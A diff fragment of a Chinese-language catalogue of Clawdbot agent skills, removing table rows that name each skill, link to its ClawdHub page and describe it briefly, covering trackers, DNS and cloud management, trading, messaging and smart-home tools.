-| fail2ban 报告器 | [Clawdbot/fail2ban-reporter](https://clawdhub.com/skills/fail2ban-reporter) | 自动将fail2ban禁止的IP报告给AbuseIPDB并通过Telegram通知。在监控服务器安全、报告攻击者或检查禁止的 IP 时使用。监视fail2ban是否有新的禁令，将其报告给AbuseIPDB，并发送警报。 |
-| 间歇性禁食追踪器 | [Clawdbot/fasting-tracker](https://clawdhub.com/skills/fasting-tracker) | 跟踪间歇性禁食窗口、延长禁食和自噬里程碑 |
-| 航班状态查询 | [Clawdbot/flights](https://clawdhub.com/skills/flights) | 跟踪航班状态、延误和搜索路线。使用 FlightAware 数据。 |
-| GA4 Analytics | [Clawdbot/ga4-analytics](https://clawdhub.com/skills/ga4-analytics) | Google Analytics 4、搜索控制台和索引 API 工具包。分析网站流量、页面性能、用户人口统计、实时访问者、搜索查询和 SEO 指标。当用户要求执行以下操作时使用：检查网站流量、分析页面浏览量、查看流量来源、查看用户人口统计数据、获取实时访客数据、检查搜索控制台查询、分析 SEO 性能、请求 URL 重新索引、检查索引状态、比较日期范围、检查跳出率、查看转化数据或获取电子商务收入。需要具有 GA4 和 Search Console 访问权限的 Google Cloud 服务帐号。 |
-| Google Search Console | [Clawdbot/gsc](https://clawdhub.com/skills/gsc) | 查询 Google Search Console 的 SEO 数据 - 搜索查询、热门页面、点击率机会、URL 检查和站点地图。在分析搜索性能、寻找优化机会或检查索引状态时使用。 |
-| 习惯追踪器 | [Clawdbot/habit-tracker](https://clawdhub.com/skills/habit-tracker) | 通过条纹、提醒和进度可视化养成习惯 |
-| 业余无线电 DX 监控 | [Clawdbot/ham-radio-dx](https://clawdhub.com/skills/ham-radio-dx) | 监控 DX 集群中的稀有电台点、跟踪活跃的 DX 探险并获取业余无线电操作员的每日频段活动摘要。 |
-| Hetzner Cloud CLI | [Clawdbot/hetzner-cloud](https://clawdhub.com/skills/hetzner-cloud) | Hetzner Cloud CLI 用于管理服务器、卷、防火墙、网络、DNS 和快照。 |
-| HoloCube | [Clawdbot/holocube](https://clawdhub.com/skills/holocube) | 使用 HoloClawd 固件控制 GeekMagic HelloCubic-Lite 全息立方体显示器。支持绘图 API、带有龙虾吉祥物的番茄计时器、GIF 上传和程序动画。 |
-| Hyperliquid 交易 | [Clawdbot/hyperliquid-trading](https://clawdhub.com/skills/hyperliquid-trading) | 交易和监控 Hyperliquid 永续期货。检查余额、查看头寸和损益、下/取消订单、执行市场交易。当用户询问 Hyperliquid 交易、投资组合状态、加密货币头寸或想要在 Hyperliquid 上执行交易时使用。 |
-| iMessage/SMS CLI | [Clawdbot/imsg](https://clawdhub.com/skills/imsg) | iMessage/SMS CLI 用于列出聊天、历史记录、观看和发送。 |
-| jq JSON 处理器 | [Clawdbot/jq](https://clawdhub.com/skills/jq) | 命令行 JSON 处理器。提取、过滤、转换 JSON。 |
-| kubectl | [Clawdbot/kubectl](https://clawdhub.com/skills/kubectl) | 通过 kubectl 命令执行和管理 Kubernetes 集群。查询资源、部署应用程序、调试容器、管理配置和监控集群运行状况。在使用 Kubernetes 集群、容器、部署或 Pod 诊断时使用。 |
-| LanceDB 内存 | [Clawdbot/lancedb-memory](https://clawdhub.com/skills/lancedb-memory) | （无） |
-| LG ThinQ | [Clawdbot/lg-thinq](https://clawdhub.com/skills/lg-thinq) | 通过 ThinQ API 控制 LG 智能电器。当用户询问其冰箱、洗衣机、烘干机、空调或其他 LG 电器时使用。支持检查状态、改变温度、切换模式（快速、环保）和监控门状态。 |
-| Lighthouse 修复器 | [Clawdbot/lighthouse-fix](https://clawdhub.com/skills/lighthouse-fix) | 运行 Lighthouse 审核并获取 AI 修复建议。提高性能时使用。 |
-| Lighthouse 修复器 | [Clawdbot/lighthouse-fixer](https://clawdhub.com/skills/lighthouse-fixer) | 运行 Lighthouse 审核并获取 AI 修复建议。提高性能时使用。 |
-| Memory Setup | [Clawdbot/memory-setup](https://clawdhub.com/skills/memory-setup) | 启用并配置 Moltbot/Clawdbot 内存搜索以获取持久上下文。在设置内存、修复“金鱼大脑”或帮助用户在其配置中配置内存搜索时使用。涵盖 MEMORY.md、每日日志和矢量搜索设置。 |
-| MeshGuard AI 治理 | [Clawdbot/meshguard](https://clawdhub.com/skills/meshguard) | 管理 MeshGuard AI 代理治理 - 代理、策略、审核日志和监控。 |
-| Minimax 使用监控 | [Clawdbot/minimax-usage](https://clawdhub.com/skills/minimax-usage) | 监控 Minimax 编码计划的使用情况以保持在 API 限制之内。获取当前使用情况统计数据并提供状态警报。 |
-| Moltbook AI 代理社交网络 | [Clawdbot/moltbook](https://clawdhub.com/skills/moltbook) | 人工智能代理的社交网络。发帖、评论、点赞和创建社区。 |
-| 监控配置生成器 | [Clawdbot/monitor-gen](https://clawdhub.com/skills/monitor-gen) | 为 Prometheus 和 Grafana 生成监控和警报配置。在设置可观测性时使用。 |
-| 监控配置生成器 | [Clawdbot/monitoring-gen](https://clawdhub.com/skills/monitoring-gen) | 生成监控和警报配置。在设置可观测性时使用。 |
-| N8n Monitor | [Clawdbot/n8n-monitor](https://clawdhub.com/skills/n8n-monitor) | （无） |
-| 网络扫描器 | [Clawdbot/network-scanner](https://clawdhub.com/skills/network-scanner) | 扫描网络以发现设备、收集 MAC 地址、供应商和主机名。支持已知网络（来自配置）或自定义 CIDR。 |
-| Nomad 集群 | [Clawdbot/nomad](https://clawdhub.com/skills/nomad) | 查询 HashiCorp Nomad 集群。列出作业、节点、分配、评估和服务。用于监控和故障排除的只读操作。 |
-| Overseerr 媒体请求 | [Clawdbot/overseerr](https://clawdhub.com/skills/overseerr) | 通过 Overseerr API 请求电影/电视并监控请求状态（稳定的 Overseerr，而不是 Beta Seerr 重写）。 |
-| 支付处理 | [Clawdbot/payment](https://clawdhub.com/skills/payment) | 付款处理和管理。处理发票、交易和支付网关集成。 |
-| PEFT Fine Tuning | [Clawdbot/peft](https://clawdhub.com/skills/peft) | 使用 LoRA、QLoRA 和 25 种以上方法对 LLM 进行参数高效的微调。当使用有限的 GPU 内存微调大型模型 (7B-70B)、需要以最小的精度损失训练 <1% 的参数或用于多适配器服务时，请使用。 HuggingFace 的官方库与 Transformer 生态系统集成。 |
-| 性能审计器 | [Clawdbot/perf-auditor](https://clawdhub.com/skills/perf-auditor) | 使用 AI 修复建议运行 Lighthouse 性能审核。当您的网站速度缓慢且需要可行的修复时使用。 |
-| 树莓派管理 | [Clawdbot/pi-admin](https://clawdhub.com/skills/pi-admin) | 树莓派系统管理。监控资源、管理服务、执行更新和维护。 |
-| PM2 进程管理 | [Clawdbot/pm2](https://clawdhub.com/skills/pm2) | 使用 PM2 流程管理器管理 Node.js 应用程序。用于在生产环境中部署、监控和自动重启 Node 应用程序。涵盖启动应用程序、查看日志、设置启动时自动启动以及管理多个进程。 |
-| 投资组合监控 | [Clawdbot/portfolio-watcher](https://clawdhub.com/skills/portfolio-watcher) | 监控股票/加密货币持有量、获取价格警报、跟踪投资组合表现 |
-| PostgreSQL | [Clawdbot/postgres](https://clawdhub.com/skills/postgres) | PostgreSQL 数据库管理。运行查询、管理架构并监控性能。 |
-| 预取顾问 | [Clawdbot/prefetcher](https://clawdhub.com/skills/prefetcher) | 人工智能建议预取路线和数据，以获得更好的用户体验。优化导航性能时使用。 |
-| Pregnancy Tracker | [Clawdbot/pregnancy-tracker](https://clawdhub.com/skills/pregnancy-tracker) | 通过每周更新、症状记录和里程碑倒计时来跟踪怀孕历程 |
-| Proactive Agent | [Clawdbot/proactive-agent](https://clawdhub.com/skills/proactive-agent) | 将人工智能代理从任务追随者转变为能够预测需求并持续改进的主动合作伙伴。包括内存架构、安全强化、自我修复模式和对齐系统。经过实战检验的代理模式，可以从每次交互中学习并在无需询问的情况下创造价值。 |
-| Query Optimizer | [Clawdbot/query-optimizer](https://clawdhub.com/skills/query-optimizer) | 使用 AI 优化 SQL 和 Prisma 查询。当查询速度很慢并且需要性能帮助时使用。 |
-| Reddit 抓取 | [Clawdbot/reddit-scraper](https://clawdhub.com/skills/reddit-scraper) | 通过 old.reddit.com 的网页抓取来阅读和搜索 Reddit 帖子。当 Clawdbot 需要浏览 Reddit 内容时使用 - 阅读 Reddit 子版块中的帖子、搜索主题、监控特定社区。只读访问权限，不得发帖或评论。 |
-| Research Tracker | [Clawdbot/research-tracker](https://clawdhub.com/skills/research-tracker) | （无） |
-| 屏幕监控 | [Clawdbot/screen-monitor](https://clawdhub.com/skills/screen-monitor) | 双模式屏幕共享和分析。模型无关（Gemini/Claude/Qwen3-VL）。 |
-| SEC 文件监控 | [Clawdbot/sec-filing-watcher](https://clawdhub.com/skills/sec-filing-watcher) | 监控 SEC EDGAR 的新申请并通过 Clawdbot 获取 Telegram/Slack 摘要。在设置 SEC 归档警报、添加/删除要监控的代码、配置表单类型、启动/停止观察程序或对归档通知进行故障排除时使用。 |
-| Shared Memory | [Clawdbot/shared-memory](https://clawdhub.com/skills/shared-memory) | 与其他用户分享记忆和状态。当用户想要共享知识、创建用户/组、授予权限、设置家庭或团队共享、订阅内存更改或管理其内存知识库的访问控制时使用。此共享内存技能使用 Ensue - 一个代理共享内存网络。 |
-| Satori 记忆 | [Clawdbot/skills](https://clawdhub.com/skills/skills) | 持久的长期记忆，用于确保提供商和代码生成工具之间的人工智能会话的连续性。 |
-| Skills.sh 搜索 | [Clawdbot/skills-search](https://clawdhub.com/skills/skills-search) | 从 CLI 搜索 Skills.sh 注册表。从 Skills.sh 生态系统中查找和发现代理技能。 |
-| Slack Context Memory | [Clawdbot/slack-context-memory](https://clawdhub.com/skills/slack-context-memory) | Slack 通道的对话摘要和上下文压缩。将上下文窗口使用率减少 70-99%，同时通过语义摘要保留关键信息。 |
-| Snapmaker 3D 打印机 | [Clawdbot/snapmaker](https://clawdhub.com/skills/snapmaker) | 监视和控制 Snapmaker 3D 打印机（带有 Moonraker/Klipper 的 U1）。检查打印状态、温度、进度或控制打印（暂停/恢复/取消）时使用。在“打印机”、“3D 打印”、“Snapmaker”、“打印状态”、“喷嘴温度”、“床温度”上触发。 |
-| Solar Weather 监控 | [Clawdbot/solar-weather](https://clawdhub.com/skills/solar-weather) | 监测太阳天气状况，包括地磁风暴、太阳耀斑、极光预报和太阳风数据。使用 NOAA 太空天气预报中心实时数据。 |
-| Sonarr 媒体管理 | [Clawdbot/sonarr](https://clawdhub.com/skills/sonarr) | 搜索电视节目并将其添加到 Sonarr。支持监控选项、添加搜索。 |
-| 股票分析 | [Clawdbot/stock-analysis](https://clawdhub.com/skills/stock-analysis) | 使用雅虎财经数据分析股票和加密货币。支持投资组合管理（创建、添加、删除资产）、加密货币分析（按市值排名前 20 名）和定期绩效报告（每日/每周/每月/季度/年度）。股票 8 个分析维度，加密货币 3 个分析维度。用于股票分析、投资组合跟踪、收益反应或加密监控。 |
-| Streaming Buddy | [Clawdbot/streaming-buddy](https://clawdhub.com/skills/streaming-buddy) | 具有学习偏好的个人流媒体助理。跟踪您正在观看的内容，了解您的品味，并根据您的服务、心情和偏好建议接下来观看的内容。当被问及电影、电视节目、流媒体服务、观看内容或跟踪观看进度时使用。触发因素：/stream、“我应该看什么”、“推荐一些东西”、提及 Netflix/Prime/Disney+/Apple TV+、询问剧集/季节/剧集、基于情绪的请求（例如“令人兴奋的东西”）。 |
-| Supermemory | [Clawdbot/supermemory](https://clawdhub.com/skills/supermemory) | 使用 SuperMemory API 存储和检索内存。添加内容、搜索记忆并与您的知识库聊天。 |
-| SwiftUI Liquid Glass | [Clawdbot/swiftui-liquid-glass](https://clawdhub.com/skills/swiftui-liquid-glass) | 使用 iOS 26+ Liquid Glass API 实施、审查或改进 SwiftUI 功能。当被要求在新的 SwiftUI UI 中采用 Liquid Glass、将现有功能重构为 Liquid Glass 或检查 Liquid Glass 使用情况的正确性、性能和设计一致性时使用。 |
-| SwiftUI Performance Audit | [Clawdbot/swiftui-performance-audit](https://clawdhub.com/skills/swiftui-performance-audit) | 通过代码审查和架构审核和改进 SwiftUI 运行时性能。用于诊断 SwiftUI 应用程序中渲染缓慢、滚动卡顿、CPU/内存使用率高、视图更新过多或布局抖动的请求，并在仅进行代码审查不够时为用户运行的 Instruments 分析提供指导。 |
-| Sysadmin Toolbox | [Clawdbot/sysadmin-toolbox](https://clawdhub.com/skills/sysadmin-toolbox) | 适用于系统管理、DevOps 和安全任务的工具发现和 shell 一行参考。当用户执行以下操作时自动咨询此技能：排除网络问题、调试进程、分析日志、使用 SSL/TLS、管理 DNS、测试 HTTP 端点、审核安全性、使用容器、编写 shell 脚本或询问“我应该为 X 使用什么工具”。来源：github.com/trimstray/the-book-of-secret-knowledge |
-| 任务状态 | [Clawdbot/task-status](https://clawdhub.com/skills/task-status) | 在聊天中发送长时间运行任务的简短状态描述。当您需要在多步骤操作期间提供定期更新、确认任务完成或通知失败时使用。包括每 5 秒发送一次更新的自动定期监控、状态消息模板以及用于一致状态报告的辅助功能。 |
-| Tesla Tessie 控制 | [Clawdbot/tesla-tessie](https://clawdhub.com/skills/tesla-tessie) | 通过 Tessie API 控制和监控 Tesla 车辆。当您需要检查 Tesla 状态（电池、位置、充电）、控制气候（加热/冷却）、锁定/解锁车门、开始/停止充电、按喇叭/闪光灯、打开充电端口或后备箱或任何其他 Tesla 车辆命令时使用。需要 TESSIE_API_KEY 环境变量。 |
-| Theme Generator | [Clawdbot/theme-gen](https://clawdhub.com/skills/theme-gen) | 使用人工智能从品牌颜色生成完整的设计系统。在开始新项目或标准化颜色时使用。 |
-| Timer | [Clawdbot/timer](https://clawdhub.com/skills/timer) | 设置计时器和闹钟。当后台计时器完成时，您会收到系统通知 - 使用提醒消息（NOT HEARTBEAT_OK）进行响应以通知用户。 |
-| TODO Tracker | [Clawdbot/todo-tracker](https://clawdhub.com/skills/todo-tracker) | 用于跨会话跟踪任务的持久 TODO 便签本。当用户说“添加到 TODO”、“TODO 上有什么”、“将 X 标记为完成”、“显示 TODO 列表”、“从 TODO 中删除”或询问待处理任务时使用。还会触发心跳来提醒陈旧的物品。 |
-| Trakt | [Clawdbot/trakt](https://clawdhub.com/skills/trakt) | 通过 trakt.tv 跟踪和查看您观看的电影和电视节目。当用户询问他们的观看历史记录、他们一直在观看的内容或想要搜索电影/节目时使用。 |
-| UI/UX Pro Max | [Clawdbot/ui-ux-pro-max](https://clawdhub.com/skills/ui-ux-pro-max) | 用于构建精美界面的 UI/UX 设计智能和实施指南。当用户要求 UI 设计、UX 流程、信息架构、视觉风格方向、设计系统/令牌、组件规格、复制/缩微、可访问性或生成/批评/完善前端 UI（HTML/CSS/JS、React、Next.js、Vue、Svelte、Tailwind）时使用。包括以下工作流程：(1) 生成新的 UI 布局和样式，(2) 改进现有的 UI/UX，(3) 生成设计系统令牌和组件指南，以及 (4) 将 UX 建议转化为具体的代码更改。 |
-| Uptime Kuma | [Clawdbot/uptime-kuma](https://clawdhub.com/skills/uptime-kuma) | 与 Uptime Kuma 监控服务器交互。用于检查监视器状态、添加/删除监视器、暂停/恢复检查、查看心跳历史记录。在提及 Uptime Kuma、服务器监控、正常运行时间检查或服务运行状况监控时触发。 |
-| Value Tracker | [Clawdbot/value-tracker](https://clawdhub.com/skills/value-tracker) | （无） |
-| Vercel React 最佳实践 | [Clawdbot/vercel-react-best-practices](https://clawdhub.com/skills/vercel-react-best-practices) | Vercel Engineering 的 React 和 Next.js 性能优化指南。在编写、审查或重构 React/Next.js 代码时应使用此技能，以确保最佳性能模式。触发涉及 React 组件、Next.js 页面、数据获取、捆绑优化或性能改进的任务。 |
-| VibeTunnel | [Clawdbot/vibetunnel](https://clawdhub.com/skills/vibetunnel) | 管理 VibeTunnel 终端会话。创建、列出、监视和控制 VibeTunnel Web 仪表板中可见的终端会话。 |
-| Virus Monitor | [Clawdbot/virus-monitor](https://clawdhub.com/skills/virus-monitor) | 维也纳病毒监控 (Abwasser + Sentinel) |
-| Weights & Biases 监控 | [Clawdbot/wandb-monitor](https://clawdhub.com/skills/wandb-monitor) | 监控和分析权重和偏差训练运行。在检查训练状态、检测故障、分析损失曲线、比较运行或监控实验时使用。触发“wandb”、“训练运行”、“训练怎么样”、“我的运行完成了吗”、“任何失败”、“检查实验”、“损失曲线”、“梯度范数”、“比较运行”。 |
-| Watch My Money | [Clawdbot/watch-my-money](https://clawdhub.com/skills/watch-my-money) | 分析银行交易、对支出进行分类、跟踪每月预算、检测超支和异常情况。输出交互式 HTML 报告。 |
-| WHOOP Tracker | [Clawdbot/whoop-tracker](https://clawdhub.com/skills/whoop-tracker) | 通过 API 访问 WHOOP 健身追踪器数据，包括恢复分数、睡眠指标、锻炼统计数据、每日压力和身体测量数据。当用户询问其 WHOOP 数据、健身指标、恢复状态、睡眠质量、锻炼表现或想要跟踪健康趋势时使用。 |
-| Wisdom & Accountability Coach | [Clawdbot/wisdom-accountability-coach](https://clawdhub.com/skills/wisdom-accountability-coach) | 纵向记忆追踪、哲学教学和富有同情心的个人责任。模式识别、斯多葛主义/佛教和成长指导方面的专家。 |
-| YouTrack | [Clawdbot/youtrack](https://clawdhub.com/skills/youtrack) | 通过 CLI 管理 YouTrack 问题、项目和工作流程。在创建、更新、搜索或评论 YouTrack 问题、列出项目、检查问题状态或自动化问题工作流程时使用。 |
-| YouTrack 项目管理 | [Clawdbot/youtrack-digisal](https://clawdhub.com/skills/youtrack-digisal) | 通过 REST API 与 YouTrack 项目管理系统交互。阅读项目和问题、创建任务、根据时间跟踪数据生成发票以及管理知识库文章。用于阅读项目和工作项、创建或更新问题、通过时间跟踪生成客户发票以及使用知识库文章。 |
-| YouTube Analytics | [Clawdbot/youtube-analytics](https://clawdhub.com/skills/youtube-analytics) | YouTube 数据 API v3 分析工具包。分析 YouTube 频道、视频和搜索结果。当用户要求执行以下操作时使用：检查 YouTube 频道统计数据、分析视频性能、比较频道、搜索视频、获取订阅者数量、查看参与度指标、查找热门视频、获取频道上传或分析 YouTube 竞争。需要 Google Cloud Console 中的 YouTube Data API v3 密钥。 |
-| YouTube Instant Article | [Clawdbot/youtube-instant-article](https://clawdhub.com/skills/youtube-instant-article) | 将 YouTube 视频转换为带有可视幻灯片和带时间戳的摘要的 Telegraph 即时查看文章。每当用户分享 YouTube URL（youtube.com 或 youtu.be）并要求总结、解释或处理视频时，请使用此技能。这是所有 YouTube 视频请求的默认技能 - 不要使用 YouTube 的通用摘要工具。 |
+<a id="cat-productivity"></a>
 
-### 🌐 网络工具
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| 奥地利公共交通查询 | [Clawdbot/a-nach-b](https://clawdhub.com/skills/a-nach-b) | 适用于全奥地利的奥地利公共交通 (VOR AnachB)。查询实时发车、搜索车站/站点、规划地点之间的路线并检查服务中断情况。在询问奥地利火车、公共汽车、电车、地铁 (U-Bahn) 或涉及奥地利公共交通的方向时使用。 |
-| 自适应技能套件 | [Clawdbot/adaptive-suite](https://clawdhub.com/skills/adaptive-suite) | 持续自适应技能套件，使 Clawdbot 能够充当多功能编码员、业务分析师、项目经理、Web 开发人员、数据分析师和 NAS 元数据抓取工具。它智能地发现免费资源，适应用户上下文，并确保跨多个领域提供可靠、经​​过验证的指导。 |
-| Agent 商务引擎 | [Clawdbot/agent-commerce-engine](https://clawdhub.com/skills/agent-commerce-engine) | 适用于 Agentic Commerce 的生产就绪通用引擎。该工具使自主代理能够通过标准化协议与任何兼容的无头电子商务后端进行交互。它为发现、购物车操作和安全用户管理提供开箱即用的支持。 |
-| Aluvia Web 代理 | [Clawdbot/aluvia-web-proxy](https://clawdhub.com/skills/aluvia-web-proxy) | 使用 Aluvia 移动代理解锁网站并绕过验证码和 403 错误。无需浏览器自动化即可启用 Web 搜索和内容提取。 |
-| Apple Photos 管理 | [Clawdbot/apple-photos](https://clawdhub.com/skills/apple-photos) | 适用于 macOS 的 Apple Photos.app 集成。列出相册、浏览照片、按日期/人物/内容搜索、导出照片。 |
-| Apple Reminders 管理 | [Clawdbot/apple-reminders](https://clawdhub.com/skills/apple-reminders) | 通过 macOS 上的“remindctl”CLI 管理 Apple 提醒（列出、添加、编辑、完成、删除）。支持列表、日期过滤器和 JSON/plain 输出。 |
-| Aviation Weather | [Clawdbot/aviation-weather](https://clawdhub.com/skills/aviation-weather) | 从 Aviationweather.gov 获取航空天气数据（METAR、TAF、PIREP）。用于飞行计划、天气简报、检查机场状况或任何与飞行员相关的天气查询。在“METAR”、“TAF”、“航班天气”、“机场天气”、“航空天气”、“飞行员报告”、“PIREP”或特定 ICAO 代码上触发。 |
-| Beeper API CLI | [Clawdbot/beeper-api-cli](https://clawdhub.com/skills/beeper-api-cli) | 通过 Beeper CLI 读取和发送消息。支持 WhatsApp、Telegram、Signal、Instagram、Twitter/X、LinkedIn、Facebook Messenger 等。 |
-| Binance 交易所 | [Clawdbot/binance](https://clawdhub.com/skills/binance) | 币安交易所整合。在全球最大的加密货币交易所交易现货、期货并管理投资组合。 |
-| Blog to Kindle | [Clawdbot/blog-to-kindle](https://clawdhub.com/skills/blog-to-kindle) | 抓取博客/论文网站并编译成 Kindle 友好的 EPUB，并带有 AI 生成的封面。用于请求下载 Kindle 博客、将文章编译成电子书或将博客档案发送到 Kindle。支持 Paul Graham、Kevin Kelly、Derek Sivers、Wait But Why、Astral Codex Ten 和自定义站点。 |
-| Claw Me Maybe 多平台消息 | [Clawdbot/claw-me-maybe](https://clawdhub.com/skills/claw-me-maybe) | Clawdbot 的蜂鸣器集成。通过 Beeper Desktop API 在 WhatsApp、Telegram、Signal、Discord、Slack、Instagram、iMessage、LinkedIn、Facebook Messenger、Google Messages 上发送消息和搜索聊天。反应、提醒、附件、标记为已读。统一的多平台消息自动化——只需询问即可。 |
-| Homebridge | [Clawdbot/clawdbot-skill-homebridge](https://clawdhub.com/skills/clawdbot-skill-homebridge) | 通过 Homebridge Config UI X REST API 控制智能家居设备。用于列出、打开/关闭、调整 HomeKit 兼容配件的亮度、颜色或温度。支持灯、开关、恒温器、风扇和其他 Homebridge 管理的设备。 |
-| Cloudflare CLI | [Clawdbot/cloudflare](https://clawdhub.com/skills/cloudflare) | Cloudflare CLI - 管理 DNS 记录、清除缓存和控制 Workers 路由。 |
-| Cloudflare API | [Clawdbot/cloudflare-api](https://clawdhub.com/skills/cloudflare-api) | 连接到 Cloudflare API 以进行 DNS 管理、隧道和区域管理。当用户需要管理域、DNS 记录或创建隧道时使用。 |
-| 暗模式生成器 | [Clawdbot/dark-mode](https://clawdhub.com/skills/dark-mode) | 使用 AI 为组件添加暗模式支持。在构建主题切换或改装深色模式时使用。 |
-| 暗模式生成器 | [Clawdbot/dark-mode-gen](https://clawdhub.com/skills/dark-mode-gen) | 为组件添加暗模式支持。在实现深色主题时使用。 |
-| Demo Video Creator | [Clawdbot/demo-video](https://clawdhub.com/skills/demo-video) | 通过自动化浏览器交互和捕获帧来创建产品演示视频。当用户想要录制 Web 应用程序的演示、演练、产品展示或交互式视频时使用。支持用于高质量捕获的 Playwright CDP 截屏视频和用于视频编码的 FFmpeg。 |
-| 抑郁症支持 | [Clawdbot/depression-support](https://clawdhub.com/skills/depression-support) | 通过情绪追踪、行为激活和自我护理为抑郁症提供日常支持 |
-| Digital Ocean | [Clawdbot/digital-ocean](https://clawdhub.com/skills/digital-ocean) | 通过 DO API 管理数字海洋水滴、域和基础设施。 |
-| Dokploy | [Clawdbot/dokploy](https://clawdhub.com/skills/dokploy) | 通过 Dokploy API 管理 Dokploy 部署、项目、应用程序和域。 |
-| 域名 DNS 管理 | [Clawdbot/domain-dns-ops](https://clawdhub.com/skills/domain-dns-ops) | Peter 的跨 Cloudflare、DNSimple、Namecheap 的域/DNS 操作。用于将区域加入 Cloudflare、翻转名称服务器、设置重定向（页面规则/规则集/工作人员）、更新重定向工作人员映射以及验证 DNS/HTTP。事实来源：~/Projects/manager。 |
-| 域名详细信息 | [Clawdbot/domaindetails](https://clawdhub.com/skills/domaindetails) | 查找域名 WHOIS/RDAP 信息并检查市场列表。免费API，无需授权。 |
-| Exa AI 搜索 | [Clawdbot/exa-plus](https://clawdhub.com/skills/exa-plus) | 通过 Exa AI 进行神经网络搜索。搜索人物、公司、新闻、研究、代码。支持深度搜索、域过滤器、日期范围。 |
-| exe.dev 虚拟机管理 | [Clawdbot/exe-dev](https://clawdhub.com/skills/exe-dev) | 管理 exe.dev 上的持久虚拟机。创建虚拟机、配置 HTTP 代理、共享访问权限并设置自定义域。使用 exe.dev VM 来托管、开发或运行持久服务时使用。 |
-| featurebase | [Clawdbot/featurebase](https://clawdhub.com/skills/featurebase) | 用于客户反馈、功能请求、变更日志和支持的功能库 API。用于管理用户反馈、跟踪功能投票、响应支持请求或发布变更日志更新。 |
-| 飞书桥接 | [Clawdbot/feishu-bridge](https://clawdhub.com/skills/feishu-bridge) | 通过WebSocket长连接连接飞书（Lark）机器人和Clawdbot。不需要公共服务器、域或 ngrok。在将飞书/Lark 设置为消息通道、对飞书网桥进行故障排除或管理网桥服务（启动/停止/日志）时使用。涵盖飞书开放平台上的机器人创建、凭证设置、桥接启动、macOS launchd 自动重启和群聊行为调整。 |
-| FreshRSS 阅读器 | [Clawdbot/freshrss-reader](https://clawdhub.com/skills/freshrss-reader) | 从自托管的 FreshRSS 实例查询标题和文章。当用户请求 RSS 新闻、最新头条新闻、提要更新或想要从 FreshRSS 阅读器浏览文章时使用。支持按类别、时间范围、数量进行过滤。 |
-| GA4 Analytics | [Clawdbot/ga4](https://clawdhub.com/skills/ga4) | 通过 Analytics Data API 查询 Google Analytics 4 (GA4) 数据。当您需要提取网站分析（例如热门页面、流量来源、用户数量、会话、转化或任何 GA4 指标/维度）时使用。支持自定义日期范围和过滤。 |
-| George 在线银行 | [Clawdbot/george](https://clawdhub.com/skills/george) | 使用 Playwright 自动化 George 在线银行（Erste 银行/奥地利 Sparkasse）：登录/会话（电话审批）、列出帐户 + 余额以及下载报表/导出/交易（CAMT53、MT940、CSV/JSON/OFX/XLSX）。当用户提及 George、Erste/Sparkasse、账户报表、CAMT53/MT940 或交易导出时使用。 |
-| GoDaddy | [Clawdbot/godaddy](https://clawdhub.com/skills/godaddy) | 用于管理 DNS 记录的 GoDaddy API。用于列出、添加、更新或删除 GoDaddy 管理的域上的 DNS 记录。 |
-| Google Chat | [Clawdbot/google-chat](https://clawdhub.com/skills/google-chat) | 通过 webhook 或 OAuth 向 Google Chat 空间和用户发送消息。当您需要向 Google Chat 频道（空间）发送通知、提醒或消息或向特定用户发送直接消息时使用。支持传入 Webhook（用于预定义通道）和 OAuth 2.0（用于向任何空间或用户动态消息传递）。 |
-| Google Maps Grounding Lite | [Clawdbot/google-maps-grounding-lite-mcp](https://clawdhub.com/skills/google-maps-grounding-lite-mcp) | Google Maps Grounding Lite MCP 通过 mcporter 进行位置搜索、天气和路线。 |
-| Heurist Mesh | [Clawdbot/heurist-mesh](https://clawdhub.com/skills/heurist-mesh) | 通过 Heurist Mesh MCP 访问 Web3 和加密情报。当用户询问加密货币分析、代币信息、趋势代币、钱包分析、Twitter/X 加密情报、资金费率、市场摘要或任何与 Web3 相关的查询时使用。 Heurist Mesh 通过 mcporter CLI 为加密用例提供 30 多个专门的 AI 代理。 |
-| Homey CLI | [Clawdbot/homey-cli](https://clawdhub.com/skills/homey-cli) | 通过 CLI 控制 Homey 家庭自动化中心。当您需要控制智能家居设备（灯、恒温器、插座等）、检查设备状态、列出区域、触发流量或执行任何 Homey 自动化任务时使用。支持开/关、调光、颜色变化、温度控制和设备检查。仅限安全、功能允许的操作。 |
-| Hyperliquid | [Clawdbot/hyperliquid](https://clawdhub.com/skills/hyperliquid) | 只读 Hyperliquid 市场数据助手（perps + Spot 可选），支持自然语言请求和确定性命令解析（终端样式“hl ...”和斜杠样式“/hl ...”）。用于通过 https://api.hyperliquid.xyz/info 获取报价 (mark/mid/oracle/funding/OI/volume)、热门动量、资金排名、L2 订单簿和蜡烛快照，并格式化聊天结果。 |
-| IBKR 交易 | [Clawdbot/ibkr-trader](https://clawdhub.com/skills/ibkr-trader) | 通过客户端 API 实现盈透证券 (IBKR) 交易自动化。在设置 IBKR 账户访问、验证会话、检查投资组合/头寸或构建交易机器人时使用。使用 IBKR Key 2FA 处理 IBeam 自动登录。 |
-| Instruments 性能分析 | [Clawdbot/instruments-profiling](https://clawdhub.com/skills/instruments-profiling) | 使用 Instruments/xctrace 分析本机 macOS 或 iOS 应用程序时使用。涵盖正确的二进制选择、CLI 参数、导出和常见问题。 |
-| 订阅取消助手 | [Clawdbot/just-fucking-cancel](https://clawdhub.com/skills/just-fucking-cancel) | 分析银行交易 CSV 以查找经常性费用、对订阅进行分类并取消不需要的内容。当用户说“取消订阅”、“审核订阅”、“查找经常性费用”或“我要支付什么费用”时使用。支持 Apple Card、Chase、Mint 和通用 CSV 格式。使用复制到取消工作流程输出交互式 HTML 审核。 |
-| Kraken 交易所 | [Clawdbot/kraken](https://clawdhub.com/skills/kraken) | 查询Kraken加密货币账户余额、投资组合、交易和质押仓位。 |
-| Lightning 支付 | [Clawdbot/lightning](https://clawdhub.com/skills/lightning) | 使用 LNI（闪电节点接口）发送和接收比特币闪电付款。支持 LND、CLN、Phoenixd、NWC 和托管服务（Strike、Blink、Speed）。 |
-| Linear 问题跟踪 | [Clawdbot/linear-issues](https://clawdhub.com/skills/linear-issues) | 与 Linear 交互以进行问题跟踪。在创建、更新、列出或搜索问题时使用。支持查看分配的问题、更改状态、添加评论和管理任务。 |
-| macOS TTS | [Clawdbot/mac-tts](https://clawdhub.com/skills/mac-tts) | 使用 macOS 内置的“say”命令进行文本转语音。用于语音通知、音频警报、大声朗读文本或通过 Mac 扬声器宣布消息。支持中文（普通话）、英语、日语等多种语言。 |
